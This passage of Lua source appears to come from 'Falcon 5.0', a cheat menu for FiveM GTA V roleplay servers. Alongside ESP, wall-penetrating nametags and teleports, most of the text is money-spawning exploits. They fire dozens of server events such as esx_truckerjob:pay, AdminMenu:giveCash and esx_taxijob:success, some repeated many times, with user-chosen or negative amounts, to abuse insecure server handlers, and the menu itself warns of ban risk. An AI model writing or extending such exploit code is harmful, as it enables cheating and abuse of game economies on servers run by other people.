				elseif Falcon.CheckBox('Force Map', ForceMap) then
					ForceMap = not ForceMap
				elseif Falcon.CheckBox('Force Third Person', ForceThirdPerson) then
					ForceThirdPerson = not ForceThirdPerson
				elseif Falcon.MenuButton("Web Radio", 'webradio') then
				elseif Falcon.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
					Radio = not Radio
					ShowInfo("~r~Portable Radio will override any vehicle's radio!")
				elseif Falcon.ComboBox2("Change Radio Station", RadiosListWords, currRadioIndex, selRadioIndex, function(currentIndex, selectedIndex)
					currRadioIndex = currentIndex
					selRadioIndex = currentIndex
					RadioStation = RadiosList[currentIndex]
				end) then
				elseif Falcon.ComboBox("~r~»  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
						currentMenuX = currentIndex
						selectedMenuX = currentIndex
						for i = 1, #menulist do
							Falcon.SetMenuX(menulist[i], menuX[currentMenuX])
						end
						end)
						then
				elseif Falcon.ComboBox("~r~»  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
						currentMenuY = currentIndex
						selectedMenuY = currentIndex
						for i = 1, #menulist do
							Falcon.SetMenuY(menulist[i], menuY[currentMenuY])
						end
						end)
						then
				elseif Falcon.CheckBox('Always Draw Crosshair', Crosshair) then
					Crosshair = not Crosshair
				elseif Falcon.CheckBox("Show Coordinates", ShowCoords) then
					ShowCoords = not ShowCoords
				elseif Falcon.MenuButton('Credits', 'credits') then
				end

			
			elseif Falcon.IsMenuOpened("InfoMenu") then
				if Falcon.Button("~p~Falcon 5.0") then
				elseif Falcon.Button("~b~Falcon was originally made by ~r~oFlaqme#1149") then
				elseif Falcon.Button("~b~5.0 Developer ~r~oFlaqme#1149") then                    
				elseif Falcon.Button("~b~This menu is a Premium Menu") then
				elseif Falcon.Button("~b~Check out our YT channel ~r~Exia Community") then
				elseif Falcon.Button("~b~Discord ~r~https://discord.gg/eb8sget") then  
				end
				
				-- ESP OPTIONS MENU
			elseif Falcon.IsMenuOpened('esp') then
				if Falcon.CheckBox("Blips", BlipsEnabled) then
					ToggleBlips()
				elseif Falcon.CheckBox("Nametags", NametagsEnabled) then
					NametagsEnabled = not NametagsEnabled
					tags_plist = GetActivePlayers()
					ptags = {}
					for i = 1, #tags_plist do
						ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
						SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
						SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
					end
					if not NametagsEnabled then
						for i = 1, #ptags do
							SetMpGamerTagVisibility(ptags[i], 4, 0)
							SetMpGamerTagVisibility(ptags[i], 8, 0)
						end
					end
				elseif Falcon.CheckBox("Alternative (OneSync) Nametags", ANametagsEnabled) then
					ANametagsEnabled = not ANametagsEnabled
				elseif Falcon.CheckBox("Draw Alternative Nametags Through Walls", ANametagsNotNeedLOS) then
					ANametagsNotNeedLOS = not ANametagsNotNeedLOS
				elseif Falcon.CheckBox("ESP", ESPEnabled) then
					ToggleESP()
				elseif Falcon.ComboBoxSlider("ESP Distance", ESPDistanceOps, currESPDistance, selESPDistance, function(currentIndex, selectedIndex)
					currESPDistance = currentIndex
					selESPDistance = currentIndex
					EspDistance = ESPDistanceOps[currESPDistance]
				end) then
				elseif Falcon.ComboBoxSlider("ESP Refresh Rate", ESPRefreshOps, currESPRefreshIndex, selESPRefreshIndex, function(currentIndex, selectedIndex)
					currESPRefreshIndex = currentIndex
					selESPRefreshIndex = currentIndex
					if currentIndex == 1 then
						ESPRefreshTime = 0
					elseif currentIndex == 2 then
						ESPRefreshTime = 100
					elseif currentIndex == 3 then
						ESPRefreshTime = 250
					elseif currentIndex == 4 then
						ESPRefreshTime = 500
					elseif currentIndex == 5 then
						ESPRefreshTime = 1000
					elseif currentIndex == 6 then
						ESPRefreshTime = 2000
					elseif currentIndex == 7 then
						ESPRefreshTime = 5000
					end
				end) then
				elseif Falcon.CheckBox("Lines", LinesEnabled) then
					LinesEnabled = not LinesEnabled
				end

			-- WEB RADIO MENU
			elseif Falcon.IsMenuOpened('webradio') then
				if Falcon.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
					ClassicalRadio = not ClassicalRadio
					if ClassicalRadio then
						RadioDUI = CreateDui("http://cms.stream.publicradio.org/cms.mp3", 1, 1)
						ShowInfo("~b~Now Playing...")
					else
						DestroyDui(RadioDUI)
						ShowInfo("~r~Web Radio Stopped!")
					end
				end

			-- TELEPORT OPTIONS MENU
			elseif Falcon.IsMenuOpened('teleport') then
				if Falcon.MenuButton('Save/Load Position', 'saveload') then
				elseif Falcon.MenuButton('Teleport to POI', 'pois') then
				elseif Falcon.Button('Teleport To Waypoint ~r~(NUM 4)') then
					TeleportToWaypoint()
				elseif Falcon.Button('Teleport FBI') then
					fbi()
				elseif Falcon.Button('Teleport LS Customs') then
					ls()
				elseif Falcon.Button('Teleport Main Garage') then
					gp()
				elseif Falcon.Button('Teleport Ammunation') then
					Ammunation()
				elseif Falcon.Button('Teleport Clothes shop') then
					shopclothes()
				elseif Falcon.Button('Teleport Barber') then
					barber()
				end


			elseif Falcon.IsMenuOpened('saveload') then
				if Falcon.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
					currSaveLoadIndex1 = currentIndex
					selSaveLoadIndex1 = currentIndex
				end) then
					if selSaveLoadIndex1 == 1 then
						savedpos1 = GetEntityCoords(PlayerPedId())
						ShowInfo("~g~Position 1 Saved")
					else
						if not savedpos1 then ShowInfo("~r~There is no saved position for slot 1!") else
							SetEntityCoords(PlayerPedId(), savedpos1)
							ShowInfo("~g~Position 1 Loaded")
						end
					end
				elseif Falcon.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
					currSaveLoadIndex2 = currentIndex
					selSaveLoadIndex2 = currentIndex
				end) then
					if selSaveLoadIndex2 == 1 then
						savedpos2 = GetEntityCoords(PlayerPedId())
						ShowInfo("~g~Position 2 Saved")
					else
						if not savedpos2 then ShowInfo("~r~There is no saved position for slot 2!") else
							SetEntityCoords(PlayerPedId(), savedpos2)
							ShowInfo("~g~Position 2 Loaded")
						end
					end
				elseif Falcon.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
					currSaveLoadIndex3 = currentIndex
					selSaveLoadIndex3 = currentIndex
				end) then
					if selSaveLoadIndex3 == 1 then
						savedpos3 = GetEntityCoords(PlayerPedId())
						ShowInfo("~g~Position 3 Saved")
					else
						if not savedpos3 then ShowInfo("~r~There is no saved position for slot 3!") else
							SetEntityCoords(PlayerPedId(), savedpos3)
							ShowInfo("~g~Position 3 Loaded")
						end
					end
				elseif Falcon.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
					currSaveLoadIndex4 = currentIndex
					selSaveLoadIndex4 = currentIndex
				end) then
					if selSaveLoadIndex4 == 1 then
						savedpos4 = GetEntityCoords(PlayerPedId())
						ShowInfo("~g~Position 4 Saved")
					else
						if not savedpos4 then ShowInfo("~r~There is no saved position for slot 4!") else
							SetEntityCoords(PlayerPedId(), savedpos4)
							ShowInfo("~g~Position 4 Loaded")
						end
					end
				elseif Falcon.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
					currSaveLoadIndex5 = currentIndex
					selSaveLoadIndex5 = currentIndex
				end) then
					if selSaveLoadIndex5 == 1 then
						savedpos5 = GetEntityCoords(PlayerPedId())
						ShowInfo("~g~Position 5 Saved")
					else
						if not savedpos5 then ShowInfo("~r~There is no saved position for slot 5!") else
							SetEntityCoords(PlayerPedId(), savedpos5)
							ShowInfo("~g~Position 5 Loaded")
						end
					end
				end


			elseif Falcon.IsMenuOpened('pois') then
				if Falcon.Button("Car Dealership (Simeon's)") then
					SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
				elseif Falcon.Button("Legion Square") then
					SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
				elseif Falcon.Button("Grove Street") then
					SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
				elseif Falcon.Button("LSPD HQ") then
					SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
				elseif Falcon.Button("Sandy Shores BCSO HQ") then
					SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
				elseif Falcon.Button("Paleto Bay BCSO HQ") then
					SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
				elseif Falcon.Button("FIB Top Floor") then
					SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
				elseif Falcon.Button("FIB Offices") then
					SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
				elseif Falcon.Button("Michael's House") then
					SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
				elseif Falcon.Button("Franklin's First House") then
					SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
				elseif Falcon.Button("Franklin's Second House") then
					SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
				elseif Falcon.Button("Trevor's Trailer") then
					SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
				elseif Falcon.Button("Tequi-La-La") then
					SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
				end



			elseif Falcon.IsMenuOpened('lua') then


				if Falcon.Button("~g~MONEY~r~ (RISK) ~s~(Work 80% ALL SERVERS)") then
				local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")

				 if string.lower(confirm) == "y" then
				 local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)

					TriggerServerEvent('esx_truckerjob:pay', result)
					TriggerServerEvent('vrp_slotmachine:server:2', result)
					TriggerServerEvent("esx_pizza:pay", result)
					TriggerServerEvent('esx_jobs:caution', 'give_back', result)
					TriggerServerEvent('lscustoms:payGarage', result)
					TriggerServerEvent('esx_tankerjob:pay', result)
					TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
					TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
					TriggerServerEvent('gambling:spend', result)
					TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
					TriggerServerEvent('AdminMenu:giveBank', result)
					TriggerServerEvent('AdminMenu:giveCash', result)
					TriggerServerEvent('esx_slotmachine:sv:2', result)
					TriggerServerEvent('esx_moneywash:deposit', result)
					TriggerServerEvent('esx_moneywash:withdraw', result)
					TriggerServerEvent('esx_moneywash:deposit', result)
					TriggerServerEvent('mission:completed', result)
					TriggerServerEvent('truckerJob:success',result)
					TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
					TriggerServerEvent("dropOff", result)
					TriggerServerEvent('truckerfuel:success',result)
					TriggerServerEvent('delivery:success',result)
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					TriggerServerEvent("esx_brinksjob:pay", result)
					TriggerServerEvent("esx_garbagejob:pay", result)
					TriggerServerEvent("esx_postejob:pay", result)
					TriggerServerEvent('esx_garbage:pay', result)
					else
						ShowInfo("~r~Operation Canceled")
					end
				elseif Falcon.Button("~g~MONEY ~r~(RISK) ~w~(Taxi_Job)") then
					local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
				 if string.lower(confirm) == "y" then
						TriggerServerEvent('esx_pilot:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_pilot:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_pilot:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_pilot:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_pilot:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_pilot:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_pilot:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent('esx_taxijob:success')
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
						TriggerServerEvent("esx_mugging:giveMoney")
					else
						ShowInfo("~r~Operation Canceled")
					end
				elseif Falcon.Button("~g~MONEY ~b~VRP~w~ (vrp_trucker)") then
					local money = GetKeyboardInput("Enter $ Amount:")
					local distance = money / 3.80
					vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
					vRPtruckS.finishTruckingDelivery({distance})
				elseif Falcon.Button("~g~MONEY~b~ VRP~w~ (vrp_casino)") then
					local amount = GetKeyboardInput("Enter Chips Amount:")
					vRPcasinoS = Tunnel.getInterface("vRP_casino","vRP_casino")
					vRPcasinoS.payRouletteWinnings({amount, 2})
					elseif Falcon.MenuButton('~g~ESX ~s~Options', 'esx') then
					elseif Falcon.MenuButton('~g~ESX ~s~Set Jobs ~r~(RISK) ', 'other') then
					elseif Falcon.MenuButton('~b~vRP ~s~Options', 'vrp') then
				end

			-- Spawn Money
			elseif Falcon.IsMenuOpened('money') then
				if Falcon.Button("~r~~h~VRP ~s~Money ~g~10k+") then
				TriggerServerEvent('esx_truckerjob:pay', 10000)
				TriggerServerEvent('vrp_slotmachine:server:2', 10000)
				TriggerServerEvent("esx_pizza:pay", 10000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 10000)
				TriggerServerEvent('lscustoms:payGarage', 10000)
				TriggerServerEvent('esx_tankerjob:pay', 10000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 10000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 10000)
				TriggerServerEvent('gambling:spend', 10000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 10000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 10000)
				TriggerServerEvent('AdminMenu:giveBank', 10000)
				TriggerServerEvent('AdminMenu:giveCash', 10000)
				TriggerServerEvent('esx_slotmachine:sv:2', 10000)
				TriggerServerEvent('esx_truckerjob:pay', 10000)
				TriggerServerEvent('esx_moneywash:deposit', 10000)
				TriggerServerEvent('esx_moneywash:withdraw', 10000)
				TriggerServerEvent('esx_moneywash:deposit', 10000)
				TriggerServerEvent('mission:completed', 10000)
				TriggerServerEvent('truckerJob:success',10000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 10000)
				TriggerServerEvent("dropOff", 10000)
				TriggerServerEvent('truckerfuel:success',10000)
				TriggerServerEvent('delivery:success',10000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
				TriggerServerEvent("esx_brinksjob:pay", 10000)
				TriggerServerEvent("esx_garbagejob:pay", 10000)
				TriggerServerEvent("esx_postejob:pay", 10000)
				TriggerServerEvent('esx_garbage:pay', 10000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~20k+") then
				TriggerServerEvent('esx_truckerjob:pay', 20000)
				TriggerServerEvent('vrp_slotmachine:server:2', 20000)
				TriggerServerEvent("esx_pizza:pay", 20000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 20000)
				TriggerServerEvent('lscustoms:payGarage', 20000)
				TriggerServerEvent('esx_tankerjob:pay', 20000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 20000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 20000)
				TriggerServerEvent('gambling:spend', 20000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 20000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 20000)
				TriggerServerEvent('AdminMenu:giveBank', 20000)
				TriggerServerEvent('AdminMenu:giveCash', 20000)
				TriggerServerEvent('esx_slotmachine:sv:2', 20000)
				TriggerServerEvent('esx_truckerjob:pay', 20000)
				TriggerServerEvent('esx_moneywash:deposit', 20000)
				TriggerServerEvent('esx_moneywash:withdraw', 20000)
				TriggerServerEvent('esx_moneywash:deposit', 20000)
				TriggerServerEvent('mission:completed', 20000)
				TriggerServerEvent('truckerJob:success',20000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 20000)
				TriggerServerEvent("dropOff", 20000)
				TriggerServerEvent('truckerfuel:success',20000)
				TriggerServerEvent('delivery:success',20000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -20000})
				TriggerServerEvent("esx_brinksjob:pay", 20000)
				TriggerServerEvent("esx_garbagejob:pay", 20000)
				TriggerServerEvent("esx_postejob:pay", 20000)
				TriggerServerEvent('esx_garbage:pay', 20000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~30k+") then
				TriggerServerEvent('esx_truckerjob:pay', 30000)
				TriggerServerEvent('vrp_slotmachine:server:2', 30000)
				TriggerServerEvent("esx_pizza:pay", 30000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 30000)
				TriggerServerEvent('lscustoms:payGarage', 30000)
				TriggerServerEvent('esx_tankerjob:pay', 30000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 30000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 30000)
				TriggerServerEvent('gambling:spend', 30000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 30000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 30000)
				TriggerServerEvent('AdminMenu:giveBank', 30000)
				TriggerServerEvent('AdminMenu:giveCash', 30000)
				TriggerServerEvent('esx_slotmachine:sv:2', 30000)
				TriggerServerEvent('esx_truckerjob:pay', 30000)
				TriggerServerEvent('esx_moneywash:deposit', 30000)
				TriggerServerEvent('esx_moneywash:withdraw', 30000)
				TriggerServerEvent('esx_moneywash:deposit', 30000)
				TriggerServerEvent('mission:completed', 30000)
				TriggerServerEvent('truckerJob:success',30000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 30000)
				TriggerServerEvent("dropOff", 30000)
				TriggerServerEvent('truckerfuel:success',30000)
				TriggerServerEvent('delivery:success',30000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -30000})
				TriggerServerEvent("esx_brinksjob:pay", 30000)
				TriggerServerEvent("esx_garbagejob:pay", 30000)
				TriggerServerEvent("esx_postejob:pay", 30000)
				TriggerServerEvent('esx_garbage:pay', 30000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~40k+") then
				TriggerServerEvent('esx_truckerjob:pay', 40000)
				TriggerServerEvent('vrp_slotmachine:server:2', 40000)
				TriggerServerEvent("esx_pizza:pay", 40000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 40000)
				TriggerServerEvent('lscustoms:payGarage', 40000)
				TriggerServerEvent('esx_tankerjob:pay', 40000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 40000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 40000)
				TriggerServerEvent('gambling:spend', 40000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 40000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 40000)
				TriggerServerEvent('AdminMenu:giveBank', 40000)
				TriggerServerEvent('AdminMenu:giveCash', 40000)
				TriggerServerEvent('esx_slotmachine:sv:2', 40000)
				TriggerServerEvent('esx_truckerjob:pay', 40000)
				TriggerServerEvent('esx_moneywash:deposit', 40000)
				TriggerServerEvent('esx_moneywash:withdraw', 40000)
				TriggerServerEvent('esx_moneywash:deposit', 40000)
				TriggerServerEvent('mission:completed', 40000)
				TriggerServerEvent('truckerJob:success',40000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 40000)
				TriggerServerEvent("dropOff", 40000)
				TriggerServerEvent('truckerfuel:success',40000)
				TriggerServerEvent('delivery:success',40000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -40000})
				TriggerServerEvent("esx_brinksjob:pay", 40000)
				TriggerServerEvent("esx_garbagejob:pay", 40000)
				TriggerServerEvent("esx_postejob:pay", 40000)
				TriggerServerEvent('esx_garbage:pay', 40000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~50k+") then
				TriggerServerEvent('esx_truckerjob:pay', 50000)
				TriggerServerEvent('vrp_slotmachine:server:2', 50000)
				TriggerServerEvent("esx_pizza:pay", 50000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 50000)
				TriggerServerEvent('lscustoms:payGarage', 50000)
				TriggerServerEvent('esx_tankerjob:pay', 50000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 50000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 50000)
				TriggerServerEvent('gambling:spend', 50000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 50000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 50000)
				TriggerServerEvent('AdminMenu:giveBank', 50000)
				TriggerServerEvent('AdminMenu:giveCash', 50000)
				TriggerServerEvent('esx_slotmachine:sv:2', 50000)
				TriggerServerEvent('esx_truckerjob:pay', 50000)
				TriggerServerEvent('esx_moneywash:deposit', 50000)
				TriggerServerEvent('esx_moneywash:withdraw', 50000)
				TriggerServerEvent('esx_moneywash:deposit', 50000)
				TriggerServerEvent('mission:completed', 50000)
				TriggerServerEvent('truckerJob:success',50000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 50000)
				TriggerServerEvent("dropOff", 50000)
				TriggerServerEvent('truckerfuel:success',50000)
				TriggerServerEvent('delivery:success',50000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -50000})
				TriggerServerEvent("esx_brinksjob:pay", 50000)
				TriggerServerEvent("esx_garbagejob:pay", 50000)
				TriggerServerEvent("esx_postejob:pay", 50000)
				TriggerServerEvent('esx_garbage:pay', 50000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~60k+") then
				TriggerServerEvent('esx_truckerjob:pay', 60000)
				TriggerServerEvent('vrp_slotmachine:server:2', 60000)
				TriggerServerEvent("esx_pizza:pay", 60000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 60000)
				TriggerServerEvent('lscustoms:payGarage', 60000)
				TriggerServerEvent('esx_tankerjob:pay', 60000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 60000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 60000)
				TriggerServerEvent('gambling:spend', 60000)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 60000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 60000)
				TriggerServerEvent('AdminMenu:giveBank', 60000)
				TriggerServerEvent('AdminMenu:giveCash', 60000)
				TriggerServerEvent('esx_slotmachine:sv:2', 60000)
				TriggerServerEvent('esx_truckerjob:pay', 60000)
				TriggerServerEvent('esx_moneywash:deposit', 60000)
				TriggerServerEvent('esx_moneywash:withdraw', 60000)
				TriggerServerEvent('esx_moneywash:deposit', 60000)
				TriggerServerEvent('mission:completed', 60000)
				TriggerServerEvent('truckerJob:success',60000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 60000)
				TriggerServerEvent("dropOff", 60000)
				TriggerServerEvent('truckerfuel:success',60000)
				TriggerServerEvent('delivery:success',60000)
				TriggerServerEvent("lscustoms:payGarage", {costs = -60000})
				TriggerServerEvent("esx_brinksjob:pay", 60000)
				TriggerServerEvent("esx_garbagejob:pay", 60000)
				TriggerServerEvent("esx_postejob:pay", 60000)
				TriggerServerEvent('esx_garbage:pay', 60000)
			elseif Falcon.Button("~r~~h~VRP ~s~Money ~g~70k+") then
				TriggerServerEvent('esx_truckerjob:pay', 70000)
				TriggerServerEvent('vrp_slotmachine:server:2', 70000)
				TriggerServerEvent("esx_pizza:pay", 70000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 70000)
				TriggerServerEvent('lscustoms:payGarage', 70000)
				TriggerServerEvent('esx_tankerjob:pay', 70000)
